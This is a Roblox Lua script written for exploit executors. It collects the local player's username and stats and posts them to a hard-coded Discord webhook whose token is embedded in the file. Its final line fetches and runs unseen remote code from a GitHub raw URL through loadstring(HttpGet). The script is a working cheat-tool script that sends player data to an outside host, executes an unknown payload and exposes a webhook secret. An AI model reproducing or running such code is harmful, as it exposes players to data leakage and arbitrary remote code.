-- Discord
-- Webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1381318412755800195/eKI_DJy-jBCkBCLfNs2kUWWRr_fS7NeJ19PbP_YgaxQI9rqtE0kTdb5tmkAq7b2h90NA"

-- Formatting Function
local function formatNumber(num)
    if type(num) ~= "number" then return tostring(num) end

    local suffixes = {
        {value = 1e15, symbol = "Qa"},
        {value = 1e12, symbol = "T"},
        {value = 1e9,  symbol = "B"},
        {value = 1e6,  symbol = "M"},
        {value = 1e3,  symbol = "K"},
    }

    local formatted = string.format("%0.0f", num):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")

    for _, v in ipairs(suffixes) do
        if num >= v.value then
            local short = string.format("%.2f", num / v.value)
            return string.format("%s (%s%s)", formatted, short, v.symbol)
        end
    end

    return formatted -- for numbers less than 1K
end

-- Get Player Info
local player = game:GetService("Players").LocalPlayer
local leaderstats = player:FindFirstChild("leaderstats")

-- Get Stats
local username = player.Name
local strength = leaderstats and leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or "N/A"
local durability = player:FindFirstChild("Durability") and player.Durability.Value or "N/A"
local agility = player:FindFirstChild("Agility") and player.Agility.Value or "N/A"
local rebirths = leaderstats and leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or "N/A"
local gems = player:FindFirstChild("Gems") and player.Gems.Value or "N/A"

-- Create Embed Data
local data = {
    ["embeds"] = {{
        ["title"] = "Player Stats",
        ["color"] = tonumber(249150), -- Green color
        ["fields"] = {
            {["name"] = "Username 👦", ["value"] = username, ["inline"] = true},
            {["name"] = "Strength 💪🏼", ["value"] = tostring(formatNumber(strength)), ["inline"] = true},
            {["name"] = "Durability 🛡", ["value"] = tostring(formatNumber(durability)), ["inline"] = true},
            {["name"] = "Agility 🏃‍♂️", ["value"] = tostring(formatNumber(agility)), ["inline"] = true},
            {["name"] = "Rebirths 🔄", ["value"] = tostring(formatNumber(rebirths)), ["inline"] = true},
            {["name"] = "Gems 💎", ["value"] = tostring(formatNumber(gems)), ["inline"] = true}
        }
    }}
}

-- Convert to JSON
local HttpService = game:GetService("HttpService")
local body = HttpService:JSONEncode(data)
local headers = {["Content-Type"] = "application/json"}

-- Send Request (Supports Different Exploits)
local function sendWebhook()
    if request then
        request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
    elseif http_request then
        http_request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
    elseif syn and syn.request then
        syn.request({Url = webhookUrl, Method = "POST", Headers = headers, Body = body})
    else
        warn("No suitable HTTP request method found.")
    end
end

sendWebhook()

loadstring(game:HttpGet("https://raw.githubusercontent.com/BirdieFallOff1111/friendly-potato/refs/heads/main/P-S"))()
